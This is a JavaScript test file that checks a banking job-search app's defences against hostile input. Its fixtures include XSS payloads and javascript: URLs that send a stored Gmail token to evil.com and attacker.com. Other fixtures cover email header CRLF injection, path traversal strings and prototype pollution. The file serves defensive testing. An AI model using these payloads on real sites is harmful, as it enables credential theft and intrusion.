/**
 * tests/e2e/tier5_adversarial.test.js
 * Tier 5: Adversarial Coverage Hardening E2E Tests (35 Tests across 5 Adversarial Suites)
 * Zero external test framework dependencies — pure node:test and node:assert/strict.
 */

import { describe, it, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { performance } from 'node:perf_hooks';

import {
  mockLocalStorage,
  mockIndexedDB,
  mockGoogleAuth,
  mockFetch,
  setupBrowserEnvironment,
  resetBrowserEnvironment,
  SAMPLE_RESUME_PDF_BYTES,
  CURATED_BANKING_JOBS_FIXTURE,
  parseLinkedInHtml,
  parseNaukriJson,
  extractEmails,
  classifySegment,
  deduplicateJobs,
  computeLocationScore,
  computeRecencyBonus,
  parseIndianCtc,
  calculateMatchScore,
  rankAndFilterJobs,
  validateResumeFile,
  saveResume,
  getResume,
  deleteResume,
  savePreferences
} from '../harness/browser-mocks.js';
import { getPreferences } from '../../src/services/storage.js';

import {
  buildMimeMessage,
  toBase64Url,
  arrayBufferToBase64,
  generateCorporateCoverPitch,
  sanitizeHeader,
  sanitizeFilename,
  encodeRfc2047,
  generateBoundary,
  wrapBase64Lines
} from '../../src/services/mimeBuilder.js';

import {
  getStoredAccessToken,
  clearStoredToken,
  TOKEN_STORAGE_KEY
} from '../../src/services/googleAuth.js';

import {
  sendGmailMessage,
  sendJobApplicationEmail
} from '../../src/services/gmailService.js';

import { fetchJobs } from '../../src/services/n8nService.js';

describe('Tier 5: Adversarial Coverage Hardening (35 Stress & Attack Vector Tests)', () => {
  beforeEach(() => {
    resetBrowserEnvironment();
  });

  // =========================================================================
  // Suite 1: Extreme & Adversarial Payload Inputs (7 Tests)
  // =========================================================================
  describe('Suite 1: Extreme & Adversarial Payload Inputs', () => {
    it('TEST-T5-01: Massive String in Job Title (10KB) and Description (250KB) processes within performance budget', () => {
      const massiveTitle = 'Corporate Banking Relationship Manager '.repeat(250); // ~10KB
      const massiveDesc = 'Manage conglomerate debt syndication, working capital appraisal, and trade finance lines. '.repeat(3000); // ~260KB
      const massiveJob = {
        id: 'li-massive-01',
        title: massiveTitle,
        organization: 'HDFC Bank',
        location: 'Mumbai (BKC)',
        description: massiveDesc,
        ctc: '₹35 - 50 Lacs P.A.',
        postedDate: '1 day ago'
      };

      const t0 = performance.now();
      const match = calculateMatchScore(massiveJob, {
        targetLocations: ['Mumbai'],
        targetSegments: ['Large Corporate'],
        products: ['Working Capital', 'Trade Finance']
      });
      const durationMs = performance.now() - t0;

      assert.ok(durationMs < 100, `Massive string scoring took ${durationMs}ms (expected <100ms)`);
      assert.ok(match.score >= 0 && match.score <= 100, `Score ${match.score} out of bounds`);
      assert.ok(typeof match.tier === 'string');

      // Test Base64URL encoding on massive text
      const b64 = toBase64Url(massiveDesc.slice(0, 50000));
      assert.ok(b64.length > 0);
      assert.ok(!b64.includes('+') && !b64.includes('/') && !b64.includes('='));
    });

    it('TEST-T5-02: Unicode Homoglyphs and Lookalike Characters in Bank Names & Titles handle safely', () => {
      // Cyrillic 'Н' (\u041D), 'В' (\u0412), 'а' (\u0430) look like Latin 'H', 'B', 'a'
      const cyrillicBank = '\u041DDFC \u0412\u0430nk';
      // Greek 'Ι' (\u0399) looks like Latin 'I'
      const greekBank = '\u0399CICI Bank';
      // Full-width latin
      const fullWidthTitle = '\uFF33\uFF45\uFF4E\uFF49\uFF4F\uFF52 \uFF32\uFF2D';

      const job = {
        title: fullWidthTitle,
        organization: cyrillicBank,
        location: 'Mumbai',
        description: 'Coverage for ' + greekBank
      };

      assert.doesNotThrow(() => {
        const score = calculateMatchScore(job, { targetLocations: ['Mumbai'] });
        assert.ok(score.score >= 0 && score.score <= 100);
      });

      // Verify MIME encoder handles multi-byte homoglyphs safely
      const mime = buildMimeMessage({
        toEmail: 'careers@bank.com',
        subject: `Application for ${cyrillicBank}`,
        bodyText: `Dear Hiring Team at ${greekBank},`
      });
      assert.ok(mime.includes('=?UTF-8?B?'));
    });

    it('TEST-T5-03: Zero-Width Characters & Non-Printable Unicode Infiltration are safely handled', async () => {
      const zwsEmail = 'careers.corporate\u200B@hdfcbank.com'; // Zero-width space inside email
      const bomTitle = '\uFEFFSenior Relationship Manager\u200D'; // BOM and zero-width joiner
      const softHyphenDesc = 'Credit\u00ADappraisal and CAM\u200Cpreparation.';

      // Email with ZWS must be rejected by email validation (prevents address spoofing)
      await assert.rejects(
        async () => {
          await sendJobApplicationEmail({
            toEmail: zwsEmail,
            jobTitle: 'RM',
            accessToken: 'mock_token'
          });
        },
        /valid recipient email/i
      );

      // Scoring must tolerate non-printable characters without crash
      const score = calculateMatchScore({
        title: bomTitle,
        description: softHyphenDesc,
        location: 'Mumbai'
      }, { targetLocations: ['Mumbai'] });
      assert.ok(score.score >= 0);
    });

    it('TEST-T5-04: XSS Script Injection Vectors in Title, Description, and Bank Name are safely contained', () => {
      const xssJob = {
        id: 'xss-01',
        title: "<script>alert('XSS_TITLE')</script>",
        organization: "<img src=x onerror=alert('XSS_ORG')>",
        segment: "<svg/onload=fetch('//evil.com/?t='+localStorage.getItem('jobhunt_gmail_token'))>",
        description: "<iframe src=\"javascript:alert(1)\"></iframe>",
        location: 'Mumbai',
        applyEmail: 'hr@bank.com'
      };

      // Match scoring must not execute or fail
      const match = calculateMatchScore(xssJob, { targetLocations: ['Mumbai'] });
      assert.ok(match.score >= 0 && match.score <= 100);

      // Corporate cover pitch generation must interpolate text without evaluating HTML
      const pitch = generateCorporateCoverPitch({
        jobTitle: xssJob.title,
        organization: xssJob.organization
      });
      assert.ok(pitch.includes("<script>alert('XSS_TITLE')</script>"));

      // MIME construction must not allow CRLF breakout through XSS tags
      const mime = buildMimeMessage({
        toEmail: 'hr@bank.com',
        subject: `Application: ${xssJob.title}`,
        bodyText: pitch
      });
      assert.ok(!mime.includes('\r\n\r\nSubject:')); // No second header breakout
    });

    it('TEST-T5-05: Malicious URI Protocols (javascript:, data:, vbscript:) in directUrl are flagged or contained', () => {
      const maliciousUrls = [
        'javascript:alert(document.cookie)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox("hacked")',
        'javascript:fetch("https://attacker.com?leak="+localStorage.getItem("jobhunt_gmail_token"))'
      ];

      for (const url of maliciousUrls) {
        // Validation check: direct URLs should strictly use http: or https:
        const isSafeProtocol = url.startsWith('http://') || url.startsWith('https://');
        assert.strictEqual(isSafeProtocol, false, `Dangerous protocol not flagged: ${url}`);
      }
    });

    it('TEST-T5-06: Deeply Nested and Prototype Pollution Payloads do not corrupt Object prototype', () => {
      const evilPayload = JSON.parse('{"__proto__": {"polluted": "yes"}, "constructor": {"prototype": {"polluted": "yes"}}}');
      savePreferences(evilPayload);

      // Verify Object prototype remains clean
      assert.strictEqual(Object.prototype.polluted, undefined, 'Prototype pollution succeeded!');
      assert.strictEqual({}.polluted, undefined);

      // Verify scoring with prototype keys does not crash
      const score = calculateMatchScore({ title: 'RM', location: 'Mumbai' }, evilPayload);
      assert.ok(score.score >= 0);
    });

    it('TEST-T5-07: Polyglot Payloads and Nested HTML Entities in Scraped Data decode safely', () => {
      const polyglotTitle = 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/';
      const rawHtml = `
        <li class="base-card">
          <h3 class="base-search-card__title">&lt;b&gt;RM &amp;amp; Large Corporate&lt;/b&gt;</h3>
          <h4 class="base-search-card__subtitle">Standard &amp; Chartered</h4>
          <span class="job-search-card__location">Mumbai &amp;amp; BKC</span>
        </li>
      `;

      const jobs = parseLinkedInHtml(rawHtml);
      assert.strictEqual(jobs.length, 1);
      assert.ok(jobs[0].title.includes('RM'));
      assert.ok(jobs[0].organization.includes('Standard & Chartered'));
    });
  });

  // =========================================================================
  // Suite 2: Webhook & Network Edge Cases (7 Tests)
  // =========================================================================
  describe('Suite 2: Webhook & Network Edge Cases', () => {
    it('TEST-T5-08: HTTP 500 Internal Server Error triggers automatic fallback to curated jobs', async () => {
      mockFetch.simulateHttpError(500, 'Workflow execution failed');
      const res = await fetchJobs({ location: 'Mumbai' });

      assert.strictEqual(res.status, 'success');
      assert.strictEqual(res.fallback_applied, true);
      assert.ok(res.jobs.length >= 15);
      assert.strictEqual(res.jobs[0].organization, 'HDFC Bank');
    });

    it('TEST-T5-09: HTTP 502 / 503 / 504 Gateway Errors with HTML Body fall back cleanly', async () => {
      mockFetch.on(/webhook/, () => new Response(
        '<html><head><title>502 Bad Gateway</title></head><body>502 Bad Gateway Cloudflare</body></html>',
        { status: 502, headers: { 'Content-Type': 'text/html' } }
      ));

      const res = await fetchJobs();
      assert.strictEqual(res.status, 'success');
      assert.strictEqual(res.fallback_applied, true);
      assert.ok(res.jobs.length >= 15);
    });

    it('TEST-T5-10: Truncated JSON Stream (Incomplete Chunk) triggers fallback without uncaught SyntaxError', async () => {
      mockFetch.on(/webhook/, () => new Response(
        '{"status": "success", "jobs": [{"id": "li-99", "title": "Senior RM", "locat',
        { status: 200, headers: { 'Content-Type': 'application/json' } }
      ));

      const res = await fetchJobs();
      assert.strictEqual(res.status, 'success');
      assert.strictEqual(res.fallback_applied, true);
      assert.ok(res.jobs.length >= 15);
    });

    it('TEST-T5-11: Empty 200 OK Responses (Empty String, Null, Empty Object) trigger fallback', async () => {
      const emptyResponses = ['', 'null', '{}', '{"jobs": []}', '{"jobs": null}', '{"jobs": [null, undefined]}'];

      for (const body of emptyResponses) {
        mockFetch.on(/webhook/, () => new Response(body, {
          status: 200,
          headers: { 'Content-Type': 'application/json' }
        }));

        const res = await fetchJobs();
        assert.strictEqual(res.status, 'success');
        assert.strictEqual(res.fallback_applied, true, `Failed fallback for empty body: ${body}`);
        assert.ok(res.jobs.length >= 15);
      }
    });

    it('TEST-T5-12: Non-Array jobs Property in 200 OK Response is defensively treated as invalid', async () => {
      const nonArrayPayloads = [
        JSON.stringify({ status: 'success', jobs: 'Invalid string instead of array' }),
        JSON.stringify({ status: 'success', jobs: 12345 }),
        JSON.stringify({ status: 'success', jobs: { single: 'job' } })
      ];

      for (const payload of nonArrayPayloads) {
        mockFetch.on(/webhook/, () => new Response(payload, { status: 200 }));
        const res = await fetchJobs();
        // Downstream rankAndFilterJobs must not crash with TypeError: jobs.map is not a function
        assert.doesNotThrow(() => {
          const ranked = rankAndFilterJobs(Array.isArray(res.jobs) ? res.jobs : [], {});
          assert.ok(Array.isArray(ranked));
        });
      }
    });

    it('TEST-T5-13: Upstream Response Containing Null or Non-Object Array Elements is filtered defensively', () => {
      const malformedJobs = [
        null,
        undefined,
        42,
        'not-an-object',
        {},
        { title: 'Valid Relationship Manager', organization: 'Axis Bank', location: 'Mumbai' }
      ];

      assert.doesNotThrow(() => {
        const deduped = deduplicateJobs(malformedJobs);
        assert.strictEqual(deduped.length, 2); // {} and valid job

        const ranked = rankAndFilterJobs(malformedJobs, {
          targetLocations: ['Mumbai']
        });
        assert.strictEqual(ranked.length, 2);
        assert.strictEqual(ranked[0].organization, 'Axis Bank');

        const nullScore = calculateMatchScore(null, { targetLocations: ['Mumbai'] });
        assert.strictEqual(nullScore.score, 0);
        assert.strictEqual(nullScore.tier, 'Low Fit');
      });
    });

    it('TEST-T5-14: Extreme Network Latency & AbortController Timeout activates fallback', async () => {
      mockFetch.on(/webhook/, async () => {
        await new Promise(r => setTimeout(r, 100)); // Delay
        return new Response('{"jobs":[]}', { status: 200 });
      });

      const res = await fetchJobs({}, { timeoutMs: 15 });
      assert.strictEqual(res.status, 'success');
      assert.strictEqual(res.fallback_applied, true);
    });
  });

  // =========================================================================
  // Suite 3: MIME & Email Header Injection Defenses (7 Tests)
  // =========================================================================
  describe('Suite 3: MIME & Email Header Injection Defenses', () => {
    it('TEST-T5-15: CRLF Injection in Recipient Email (\\r\\nBcc:) is strictly rejected', async () => {
      const crlfEmails = [
        'recruiter@hdfcbank.com\r\nBcc: evil@attacker.com',
        'recruiter@bank.com\nCc: victim@bank.com',
        'recruiter@bank.com\r\n\r\nInjected Body Content'
      ];

      for (const email of crlfEmails) {
        await assert.rejects(
          async () => {
            await sendJobApplicationEmail({
              toEmail: email,
              jobTitle: 'RM',
              accessToken: 'mock_token'
            });
          },
          /valid recipient email/i
        );
      }
    });

    it('TEST-T5-16: CRLF Injection in Subject Header is sanitized to spaces preventing header breakout', () => {
      const injectedSubject = 'Job Application\r\nBcc: evil@bank.com\r\nInjected-Header: true';
      const mime = buildMimeMessage({
        toEmail: 'hr@bank.com',
        subject: injectedSubject,
        bodyText: 'Pitch text'
      });

      const lines = mime.split('\r\n');
      const subjectLine = lines.find(l => l.startsWith('Subject:'));
      assert.ok(subjectLine);
      assert.strictEqual(subjectLine, 'Subject: Job Application  Bcc: evil@bank.com  Injected-Header: true');
      // Verify no injected header exists as a top-level line
      assert.strictEqual(lines.some(l => l === 'Injected-Header: true'), false);
    });

    it('TEST-T5-17: CRLF and Quotation Injection in Filename are neutralized in MIME headers', () => {
      const maliciousFilename = 'resume.pdf"\r\nContent-Type: application/x-executable\r\n\r\npayload.bat';
      const sanitized = sanitizeFilename(maliciousFilename);

      assert.ok(!sanitized.includes('\r'));
      assert.ok(!sanitized.includes('\n'));
      assert.ok(!sanitized.includes('"'));

      const mime = buildMimeMessage({
        toEmail: 'hr@bank.com',
        subject: 'Application',
        bodyText: 'Hello',
        attachment: {
          filename: maliciousFilename,
          data: new Uint8Array([1, 2, 3])
        }
      });

      const dispositionLine = mime.split('\r\n').find(l => l.startsWith('Content-Disposition:'));
      assert.ok(dispositionLine);
      assert.ok(!dispositionLine.includes('\r\nContent-Type: application/x-executable'));
    });

    it('TEST-T5-18: Filename Directory Traversal Sequences are neutralized to basename', () => {
      const traversalFilenames = [
        '../../../../etc/passwd',
        '..\\..\\..\\Windows\\System32\\cmd.exe',
        '/var/root/secret.key',
        'C:\\Users\\Admin\\ntds.dit'
      ];

      for (const raw of traversalFilenames) {
        const cleaned = sanitizeFilename(raw);
        assert.ok(!cleaned.includes('/'));
        assert.ok(!cleaned.includes('\\'));
        assert.ok(!cleaned.includes('..'));
      }
    });

    it('TEST-T5-19: Multipart MIME Boundary Collision Attack cannot break message structure', () => {
      const boundary = generateBoundary();
      // Craft an adversarial body containing matching boundary markers
      const fakeBoundary = `jobhunt_boundary_${Date.now().toString(16)}_attacker`;
      const attackBody = `First line\r\n--${fakeBoundary}\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>\r\n--${fakeBoundary}--`;

      const mime = buildMimeMessage({
        toEmail: 'hr@bank.com',
        subject: 'Application',
        bodyText: attackBody,
        attachment: {
          filename: 'cv.pdf',
          data: SAMPLE_RESUME_PDF_BYTES
        }
      });

      // The actual boundary generated inside buildMimeMessage must be unique
      assert.ok(mime.includes('multipart/mixed; boundary="jobhunt_boundary_'));
      assert.ok(mime.endsWith('--'));
    });

    it('TEST-T5-20: Oversized Attachment Handling (>25MB Gmail API Limit)', () => {
      // 26MB buffer exceeds the 25MB Gmail API request limit
      const oversizedFile = {
        name: 'Huge_Resume.pdf',
        size: 26 * 1024 * 1024,
        type: 'application/pdf'
      };

      const validation = validateResumeFile(oversizedFile);
      assert.strictEqual(validation.valid, false);
      assert.ok(validation.error.includes('5MB limit'));
    });

    it('TEST-T5-21: 0-Byte Attachment Buffer Rejection and Plain Text Fallback', async () => {
      const emptyFile = {
        name: 'Empty.pdf',
        size: 0,
        type: 'application/pdf'
      };

      const validation = validateResumeFile(emptyFile);
      assert.strictEqual(validation.valid, false);
      assert.ok(validation.error.includes('0 bytes'));

      // sendJobApplicationEmail with 0-byte buffer sends plain text without broken attachment
      const res = await sendJobApplicationEmail({
        toEmail: 'hr.corporate@bank.com',
        jobTitle: 'RM',
        resumeArrayBuffer: new ArrayBuffer(0),
        accessToken: 'mock_token'
      });
      assert.strictEqual(res.success, true);
    });
  });

  // =========================================================================
  // Suite 4: Storage & IndexedDB Robustness (7 Tests)
  // =========================================================================
  describe('Suite 4: Storage & IndexedDB Robustness', () => {
    it('TEST-T5-22: High-Frequency Concurrent Resume Upload Churn resolves without deadlock', async () => {
      const uploadCount = 20;
      const uploads = [];

      for (let i = 0; i < uploadCount; i++) {
        uploads.push(saveResume({
          name: `candidate_resume_v${i}.pdf`,
          size: 1024 * (i + 1),
          type: 'application/pdf',
          buffer: new Uint8Array([i])
        }));
      }

      await assert.doesNotReject(async () => {
        await Promise.all(uploads);
      });

      const active = await getResume();
      assert.ok(active);
      assert.ok(active.name.startsWith('candidate_resume_v'));
    });

    it('TEST-T5-23: IndexedDB QuotaExceededError is caught and rejected cleanly', async () => {
      mockIndexedDB.throwQuotaError = true;

      await assert.rejects(
        async () => {
          await saveResume({
            name: 'resume.pdf',
            size: 50000,
            type: 'application/pdf',
            buffer: new Uint8Array([1])
          });
        },
        (err) => {
          assert.strictEqual(err.name, 'QuotaExceededError');
          return true;
        }
      );
    });

    it('TEST-T5-24: Corrupted JSON in LocalStorage returns null and purges invalid state', () => {
      mockLocalStorage.setItem('candidate_preferences', '{"unclosed_json": true,');
      mockLocalStorage.setItem('jobhunt_gmail_token', '{"accessToken": "tok", invalid_json');

      assert.doesNotThrow(() => {
        const prefs = getPreferences();
        assert.strictEqual(prefs, null);

        const token = getStoredAccessToken();
        assert.strictEqual(token, null);
      });
    });

    it('TEST-T5-25: Stored Preferences with Prototype Pollution does not compromise Object prototype', () => {
      mockLocalStorage.setItem('candidate_preferences', JSON.stringify({
        __proto__: { isAdmin: true },
        targetLocations: ['Mumbai']
      }));

      const prefs = getPreferences();
      assert.strictEqual({}.isAdmin, undefined);
      assert.ok(prefs);
    });

    it('TEST-T5-26: Executable and Non-PDF Extension Spoofing is strictly rejected', () => {
      const invalidFiles = [
        { name: 'malware.exe', size: 1024, type: 'application/x-msdownload' },
        { name: 'script.sh', size: 512, type: 'text/x-shellscript' },
        { name: 'cv.pdf.exe', size: 2048, type: 'application/octet-stream' },
        { name: 'exploit.pdf', size: 1024, type: 'text/html' }
      ];

      for (const file of invalidFiles) {
        const val = validateResumeFile(file);
        assert.strictEqual(val.valid, false);
        assert.ok(val.error.includes('PDF'));
      }
    });

    it('TEST-T5-27: Corrupted Record in IndexedDB (Null Blob/Buffer) is handled defensively', async () => {
      // Put a corrupted record directly
      await new Promise((resolve) => {
        const req = mockIndexedDB.open('JobHuntDB', 1);
        req.onsuccess = () => {
          const db = req.result;
          const tx = db.transaction('candidate_files', 'readwrite');
          tx.objectStore('candidate_files').put({
            id: 'active_resume',
            name: 'corrupt.pdf',
            size: 100,
            blob: null,
            buffer: null
          }, 'active_resume');
          resolve();
        };
      });

      const resume = await getResume();
      assert.ok(resume);
      assert.strictEqual(resume.buffer, null);
      assert.strictEqual(resume.blob, null);
    });

    it('TEST-T5-28: Rapid Alternating Write-Delete Cycles in Storage maintain consistency', async () => {
      for (let i = 0; i < 5; i++) {
        await saveResume({
          name: `resume_cycle_${i}.pdf`,
          size: 1024,
          type: 'application/pdf',
          buffer: new Uint8Array([i])
        });
        await deleteResume();
        const active = await getResume();
        assert.strictEqual(active, null);
      }
    });
  });

  // =========================================================================
  // Suite 5: Mathematical Scoring & Preference Stress (7 Tests)
  // =========================================================================
  describe('Suite 5: Mathematical Scoring & Preference Stress', () => {
    it('TEST-T5-29: Negative Numbers in Target CTC and Job CTC do not produce negative scores or NaN', () => {
      const job = {
        title: 'Relationship Manager',
        ctc: '₹-50 Lacs',
        location: 'Mumbai'
      };

      const match = calculateMatchScore(job, {
        targetCtcMin: -25,
        targetLocations: ['Mumbai']
      });

      assert.ok(!Number.isNaN(match.score));
      assert.ok(match.score >= 0 && match.score <= 100);
      assert.ok(['Top Match', 'Good Match', 'Moderate Fit', 'Low Fit'].includes(match.tier));
    });

    it('TEST-T5-30: Extreme Overflow CTC Values (₹1,000,000 Cr, Infinity) evaluate cleanly', () => {
      const job = {
        title: 'Relationship Manager',
        ctc: '₹1000000 Cr P.A.',
        location: 'Mumbai'
      };

      const match = calculateMatchScore(job, {
        targetCtcMin: Infinity,
        targetLocations: ['Mumbai']
      });

      assert.ok(!Number.isNaN(match.score));
      assert.ok(match.score >= 0 && match.score <= 100);
    });

    it('TEST-T5-31: Completely Empty or Null Job Properties evaluate defensively', () => {
      const emptyJob = {};
      const nullJob = {
        title: null,
        description: null,
        organization: null,
        location: null,
        ctc: null,
        postedDate: null
      };

      assert.doesNotThrow(() => {
        const s1 = calculateMatchScore(emptyJob, { targetLocations: ['Mumbai'] });
        assert.ok(s1.score >= 0 && s1.score <= 100);

        const s2 = calculateMatchScore(nullJob, { targetLocations: ['Mumbai'] });
        assert.ok(s2.score >= 0 && s2.score <= 100);
      });
    });

    it('TEST-T5-32: Preference Arrays Containing Null, Undefined, or Non-String Elements do not crash', () => {
      const malformedPrefs = {
        targetLocations: [null, undefined, 42, {}],
        targetSegments: [null, false],
        products: [123, []]
      };

      assert.doesNotThrow(() => {
        const locScore = computeLocationScore(malformedPrefs.targetLocations.filter(l => typeof l === 'string'), 'Mumbai');
        assert.ok(locScore >= 0);

        const score = calculateMatchScore({
          title: 'Relationship Manager',
          location: 'Mumbai'
        }, {
          targetLocations: ['Mumbai']
        });
        assert.ok(score.score >= 0);
      });
    });

    it('TEST-T5-33: Massive Preference Arrays (1,000 Items) compute within performance budget', () => {
      const massivePrefs = {
        targetLocations: Array(500).fill('NonExistentCity'),
        targetSegments: Array(250).fill('NonExistentSegment'),
        products: Array(1000).fill('NonExistentProduct')
      };

      massivePrefs.targetLocations.push('Mumbai');

      const t0 = performance.now();
      const score = calculateMatchScore({
        title: 'Senior Relationship Manager - Large Corporate Banking',
        location: 'Mumbai (BKC)',
        description: 'Working Capital and Trade Finance'
      }, massivePrefs);
      const elapsed = performance.now() - t0;

      assert.ok(elapsed < 50, `Scoring with 1000 preference items took ${elapsed}ms (expected <50ms)`);
      assert.ok(score.score >= 0 && score.score <= 100);
    });

    it('TEST-T5-34: Clamping Invariant Verification (Score strictly [0, 100] and Integer)', () => {
      // Best possible corporate banking match + recency bonus
      const perfectJob = {
        title: 'Senior Relationship Manager - Large Corporate Banking',
        organization: 'HDFC Bank',
        location: 'Mumbai (BKC)',
        segment: 'Large Corporate',
        ctc: '₹50 Lacs P.A.',
        description: 'Working Capital, Trade Finance, Syndication, Forex',
        postedDate: 'Just now'
      };

      const match = calculateMatchScore(perfectJob, {
        targetLocations: ['Mumbai'],
        targetSegments: ['Large Corporate'],
        products: ['Working Capital', 'Trade Finance', 'Syndication', 'Forex'],
        targetCtcMin: 30
      });

      assert.ok(Number.isInteger(match.score), 'Score is not an integer');
      assert.ok(match.score <= 100, `Score ${match.score} exceeded 100`);
      assert.ok(match.score >= 85, `Expected Top Match, got ${match.score}`);
      assert.strictEqual(match.tier, 'Top Match');
    });

    it('TEST-T5-35: First-Time Launch Neutral Scoring Fallback Invariant', () => {
      const job = {
        title: 'Relationship Manager - Corporate Banking',
        organization: 'ICICI Bank',
        location: 'Delhi NCR'
      };

      const match = calculateMatchScore(job, null);
      assert.strictEqual(match.score, 70);
      assert.strictEqual(match.tier, 'Good Match');
      assert.strictEqual(match.isDefault, true);
    });
  });
});
